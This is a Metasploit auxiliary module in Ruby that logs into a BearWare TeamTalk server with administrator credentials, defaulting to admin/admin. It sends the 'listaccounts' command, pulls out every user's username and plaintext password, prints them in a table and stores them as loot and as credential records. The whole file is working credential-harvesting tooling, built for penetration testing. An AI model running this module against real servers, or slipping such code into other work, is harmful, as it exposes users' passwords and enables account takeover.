##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'TeamTalk Gather Credentials',
      'Description' => %q{
        This module retrieves user credentials from BearWare TeamTalk.

        Valid administrator credentials are required.

        This module has been tested successfully on TeamTalk versions
        5.2.2.4885 and 5.2.3.4893.
      },
      'Author'      => 'bcoles',
      'References'  =>
        [
          # Protocol documentation
          ['URL', 'https://github.com/BearWare/TeamTalk5/blob/master/ttphpadmin/tt5admin.php']
        ],
      'License'     => MSF_LICENSE))
    register_options [
      Opt::RPORT(10333),
      OptString.new('USERNAME', [true, 'The username for TeamTalk', 'admin']),
      OptString.new('PASSWORD', [true, 'The password for the specified username', 'admin'])
    ]
  end

  def run
    vprint_status 'Connecting...'

    connect
    banner = sock.get_once

    unless banner =~ /^teamtalk\s.*protocol="([\d\.]+)"/
      fail_with Failure::BadConfig, 'TeamTalk does not appear to be running'
    end

    print_status "Found TeamTalk (protocol version #{$1})"

    report_service :host  => rhost,
                   :port  => rport,
                   :proto => 'tcp',
                   :name  => 'teamtalk'

    vprint_status "Authenticating as '#{username}'"

    req = "login username=\"#{username.tr('"', '\"')}\" password=\"#{password.tr('"', '\"')}\""
    res = send_command req

    unless res.to_s.starts_with? 'accepted'
      fail_with Failure::NoAccess, 'Authentication failed'
    end

    print_good 'Authenticated successfully'

    if res =~ /usertype=2/
      print_good 'User is an administrator'
    else
      print_warning 'User is not an administrator'
    end

    vprint_status "Retrieving users..."

    res = send_command 'listaccounts'

    if res =~ /^error/ && res =~ /message="Command not authorized"/
      print_error 'Insufficient privileges'
      return
    end

    unless res =~ /^ok\r?\n?\z/
      print_error 'Unexpected reply'
      return
    end

    cred_table = Rex::Text::Table.new 'Header'  => 'TeamTalk User Credentials',
                                      'Indent'  => 1,
                                      'Columns' => ['Username', 'Password', 'Type']

    res.each_line do |line|
      line.chomp!
      next unless line =~ /^useraccount/

      user = line.scan(/\s+username="(.*?)"\s+password=/).flatten.first.to_s.gsub('\"', '"')
      pass = line.scan(/\s+password="(.*?)"\s+usertype=/).flatten.first.to_s.gsub('\"', '"')
      type = line.scan(/\s+usertype=(\d+)\s+/).flatten.first

      cred_table << [ user, pass, type ]
      report_cred user:     user,
                  password: pass,
                  type:     type,
                  proof:    line
    end

    if cred_table.rows.empty?
      print_error 'Did not find any users'
      return
    end

    print_status "Found #{cred_table.rows.size} users"
    print_line
    print_line cred_table.to_s

    p = store_loot 'teamtalk.user.creds',
                   'text/csv',
                   rhost,
                   cred_table.to_csv,
                   'TeamTalk User Credentials'

    print_good "Credentials saved in: #{p}"
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
    print_error e.message
  ensure
    disconnect
  end

  private

  def username
    datastore['USERNAME'] || ''
  end

  def password
    datastore['PASSWORD'] || ''
  end

  def report_cred(opts)
    service_data = {
      address:      rhost,
      port:         rport,
      service_name: 'teamtalk',
      protocol:     'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type:     :service,
      module_fullname: fullname,
      username:        opts[:user],
      private_data:    opts[:password],
      private_type:    :password
    }.merge service_data

    login_data = {
      core:              create_credential(credential_data),
      status:            Metasploit::Model::Login::Status::UNTRIED,
      access_level:      opts[:type],
      proof:             opts[:proof]
    }.merge service_data

    create_credential_login login_data
  end

  def send_command(cmd = '')
    cmd_id = rand(1000)
    sock.put "#{cmd} id=#{cmd_id}\n"

    res = ''
    timeout = 15
    Timeout.timeout(timeout) do
      res << sock.get_once until res =~ /^end id=#{cmd_id}/
    end

    res.to_s.scan(/begin id=#{cmd_id}\r?\n(.*)\r?\nend id=#{cmd_id}/m).flatten.first
  rescue Timeout::Error
    print_error "Timeout (#{timeout} seconds)"
  rescue => e
    print_error e.message
  end
end
